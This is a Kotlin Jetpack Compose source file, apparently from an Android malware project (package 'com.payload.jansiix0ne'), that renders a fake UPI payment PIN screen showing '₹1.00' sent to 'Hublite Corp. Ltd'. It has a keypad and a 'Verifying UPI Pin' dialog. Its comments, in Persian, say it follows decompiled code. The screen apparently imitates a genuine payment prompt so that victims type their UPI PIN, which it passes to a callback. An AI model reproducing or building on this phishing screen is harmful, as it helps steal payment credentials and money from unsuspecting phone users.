package com.payload.jansiix0ne.ui.screens

import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.CircularProgressIndicator
import androidx.compose.material3.Text
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.window.Dialog
import com.payload.jansiix0ne.R

@Composable
fun UPIPinScreen(
    amount: String = "₹1.00",
    recipient: String = "Hublite Corp. Ltd",
    onPinEntered: (String) -> Unit,
    onCancel: () -> Unit
) {
    var pin by remember { mutableStateOf("") }
    var isVerifying by remember { mutableStateOf(false) }
    
    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(Color.White)
            .padding(24.dp),
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Spacer(modifier = Modifier.height(40.dp))
        
        // UPI Logo - استفاده از تصویر واقعی
        Image(
            painter = painterResource(id = R.drawable.upi_pin_img),
            contentDescription = "UPI Logo",
            modifier = Modifier
                .size(68.dp)
                .padding(bottom = 16.dp)
        )
        
        // Transaction Details
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(vertical = 16.dp),
            horizontalArrangement = Arrangement.SpaceBetween
        ) {
            Text(
                text = "Sending:",
                fontSize = 16.sp,
                color = Color.Gray
            )
            Text(
                text = amount,
                fontSize = 18.sp,
                fontWeight = FontWeight.Bold,
                color = Color.Black
            )
        }
        
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(bottom = 32.dp),
            horizontalArrangement = Arrangement.SpaceBetween
        ) {
            Text(
                text = "To:",
                fontSize = 16.sp,
                color = Color.Gray
            )
            Text(
                text = recipient,
                fontSize = 18.sp,
                fontWeight = FontWeight.Bold,
                color = Color.Black
            )
        }
        
        // Enter PIN Text
        Text(
            text = "ENTER UPI PIN",
            fontSize = 20.sp,
            fontWeight = FontWeight.Bold,
            color = Color.Black,
            modifier = Modifier.padding(bottom = 24.dp)
        )
        
        // PIN Dots - پشتیبانی از 4 یا 6 رقم (مطابق کد decompiled)
        Row(
            modifier = Modifier.padding(bottom = 24.dp),
            horizontalArrangement = Arrangement.spacedBy(16.dp)
        ) {
            repeat(6) { index ->
                Box(
                    modifier = Modifier
                        .size(16.dp)
                        .clip(CircleShape)
                        .background(
                            if (index < pin.length) Color.Black else Color.Gray.copy(alpha = 0.3f)
                        )
                )
            }
        }
        
        // Info Banner
        Box(
            modifier = Modifier
                .fillMaxWidth()
                .clip(RoundedCornerShape(12.dp))
                .background(Color(0xFFFFF3CD))
                .padding(16.dp),
            contentAlignment = Alignment.CenterStart
        ) {
            Row(
                verticalAlignment = Alignment.CenterVertically
            ) {
                Box(
                    modifier = Modifier
                        .size(24.dp)
                        .clip(CircleShape)
                        .background(Color(0xFFFF9800)),
                    contentAlignment = Alignment.Center
                ) {
                    Text(
                        text = "i",
                        color = Color.White,
                        fontSize = 16.sp,
                        fontWeight = FontWeight.Bold
                    )
                }
                Spacer(modifier = Modifier.width(12.dp))
                Text(
                    text = "You are sending $amount from your account to $recipient",
                    fontSize = 12.sp,
                    color = Color.Black,
                    modifier = Modifier.weight(1f)
                )
            }
        }
        
        Spacer(modifier = Modifier.weight(1f))
        
        // Number Pad
        NumberPad(
            onNumberClick = { number ->
                // مطابق کد decompiled: حداکثر 6 رقم
                if (pin.length < 6) {
                    pin += number
                }
            },
            onDeleteClick = {
                if (pin.isNotEmpty()) {
                    pin = pin.dropLast(1)
                }
            },
            onConfirmClick = {
                // مطابق کد decompiled: PIN باید 4 یا 6 رقم باشد
                if (pin.length == 4 || pin.length == 6) {
                    android.util.Log.d("UPIPinScreen", "✅ PIN entered: ${pin.length} digits")
                    isVerifying = true
                    onPinEntered(pin)
                } else {
                    android.util.Log.w("UPIPinScreen", "⚠️ Invalid PIN length: ${pin.length} (must be 4 or 6)")
                }
            }
        )
    }
    
    // Verifying Dialog
    if (isVerifying) {
        Dialog(onDismissRequest = {}) {
            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .clip(RoundedCornerShape(24.dp))
                    .background(Color.White)
                    .padding(32.dp),
                contentAlignment = Alignment.Center
            ) {
                Column(
                    horizontalAlignment = Alignment.CenterHorizontally
                ) {
                    // Verification Icon (placeholder - you can add an actual icon)
                    Spacer(modifier = Modifier.height(20.dp))
                    CircularProgressIndicator(
                        modifier = Modifier.size(48.dp),
                        color = Color(0xFF4CAF50)
                    )
                    Spacer(modifier = Modifier.height(24.dp))
                    Text(
                        text = "Verifying UPI Pin",
                        fontSize = 18.sp,
                        fontWeight = FontWeight.Bold,
                        color = Color.Black
                    )
                }
            }
        }
    }
}

@Composable
fun NumberPad(
    onNumberClick: (String) -> Unit,
    onDeleteClick: () -> Unit,
    onConfirmClick: () -> Unit
) {
    Column(
        modifier = Modifier.fillMaxWidth(),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.spacedBy(12.dp)
    ) {
        // Row 1: 1, 2, 3
        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.spacedBy(12.dp)
        ) {
            NumberButton("1", onClick = { onNumberClick("1") }, modifier = Modifier.weight(1f))
            NumberButton("2", onClick = { onNumberClick("2") }, modifier = Modifier.weight(1f))
            NumberButton("3", onClick = { onNumberClick("3") }, modifier = Modifier.weight(1f))
        }
        
        // Row 2: 4, 5, 6
        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.spacedBy(12.dp)
        ) {
            NumberButton("4", onClick = { onNumberClick("4") }, modifier = Modifier.weight(1f))
            NumberButton("5", onClick = { onNumberClick("5") }, modifier = Modifier.weight(1f))
            NumberButton("6", onClick = { onNumberClick("6") }, modifier = Modifier.weight(1f))
        }
        
        // Row 3: 7, 8, 9
        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.spacedBy(12.dp)
        ) {
            NumberButton("7", onClick = { onNumberClick("7") }, modifier = Modifier.weight(1f))
            NumberButton("8", onClick = { onNumberClick("8") }, modifier = Modifier.weight(1f))
            NumberButton("9", onClick = { onNumberClick("9") }, modifier = Modifier.weight(1f))
        }
        
        // Row 4: Delete, 0, Confirm
        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.spacedBy(12.dp)
        ) {
            DeleteButton(onClick = onDeleteClick, modifier = Modifier.weight(1f))
            NumberButton("0", onClick = { onNumberClick("0") }, modifier = Modifier.weight(1f))
            ConfirmButton(onClick = onConfirmClick, modifier = Modifier.weight(1f))
        }
    }
}

@Composable
fun NumberButton(
    number: String,
    onClick: () -> Unit,
    modifier: Modifier = Modifier
) {
    Button(
        onClick = onClick,
        modifier = modifier
            .aspectRatio(1f)
            .height(64.dp),
        shape = RoundedCornerShape(12.dp),
        colors = ButtonDefaults.buttonColors(
            containerColor = Color(0xFF2196F3)
        )
    ) {
        Text(
            text = number,
            fontSize = 24.sp,
            fontWeight = FontWeight.Bold,
            color = Color.White
        )
    }
}

@Composable
fun DeleteButton(
    onClick: () -> Unit,
    modifier: Modifier = Modifier
) {
    Button(
        onClick = onClick,
        modifier = modifier
            .aspectRatio(1f)
            .height(64.dp),
        shape = RoundedCornerShape(12.dp),
        colors = ButtonDefaults.buttonColors(
            containerColor = Color(0xFF2196F3)
        )
    ) {
        Text(
            text = "⌫",
            fontSize = 24.sp,
            color = Color.White
        )
    }
}

@Composable
fun ConfirmButton(
    onClick: () -> Unit,
    modifier: Modifier = Modifier
) {
    Button(
        onClick = onClick,
        modifier = modifier
            .aspectRatio(1f)
            .height(64.dp),
        shape = CircleShape,
        colors = ButtonDefaults.buttonColors(
            containerColor = Color(0xFF2196F3)
        )
    ) {
        Text(
            text = "✓",
            fontSize = 24.sp,
            color = Color.White,
            fontWeight = FontWeight.Bold
        )
    }
}
